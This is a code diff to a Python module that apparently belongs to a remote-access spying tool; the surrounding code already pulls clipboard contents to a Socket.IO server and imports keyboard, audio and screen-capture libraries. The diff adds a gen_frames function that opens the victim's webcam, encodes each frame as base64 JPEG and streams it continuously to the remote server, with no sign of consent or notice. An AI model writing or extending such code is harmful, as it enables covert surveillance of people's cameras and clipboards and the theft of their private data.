@@ -3,6 +3,7 @@ import io
 import time
 import wave
 
+import cv2
 import keyboard
 import pyaudio
 import pyautogui
@@ -94,3 +95,29 @@ def get_clipboard_content(sio=None):
             print("Aucun contenu trouvé dans le presse-papiers ou connexion au serveur Socket.IO manquante.")
     except Exception as e:
         print(f"Échec de la récupération du presse-papiers: {e}")
+
+def gen_frames(sio):
+    try:
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
+        if not camera.isOpened():
+            raise ValueError("Failed to open webcam")
+
+        while True:
+            success, frame = camera.read()
+            if not success:
+                print("Failed to read frame from webcam")
+                break
+            else:
+                ret, buffer = cv2.imencode('.jpg', frame)
+                if not ret:
+                    print("Failed to encode frame")
+                    continue
+                frame_bytes = base64.b64encode(buffer)
+                sio.emit('webcam_response', {'data': frame_bytes.decode()})
+
+    except Exception as e:
+        print(f"Failed to initialize or read from webcam: {e}")
+    finally:
+        if 'camera' in locals() and camera.isOpened():
+            camera.release()
+        cv2.destroyAllWindows()
